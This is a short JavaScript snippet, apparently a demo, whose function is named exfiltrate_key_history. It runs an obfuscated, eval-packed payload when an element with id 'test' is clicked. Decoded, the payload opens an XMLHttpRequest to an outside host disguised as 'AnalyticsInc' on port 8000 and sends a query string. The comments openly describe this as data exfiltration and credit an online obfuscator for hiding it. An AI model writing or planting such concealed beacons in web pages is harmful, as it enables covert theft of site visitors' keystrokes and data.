function exfiltrate_key_history() {

    // http://www.daftlogic.com/projects-online-javascript-obfuscator.htm
    // Exfiltrate data using XMLHTTP request
    eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0=5 4();0.7("3","1://2:6/8.d?"+"c=b",9);0.a(e);',15,15,'xmlhttp|http|AnalyticsInc|GET|XMLHttpRequest|new|8000|open|submission|true|send|daftlogic|test|html|null'.split('|'),0,{}))

}

document.getElementById('test').onclick = exfiltrate_key_history;
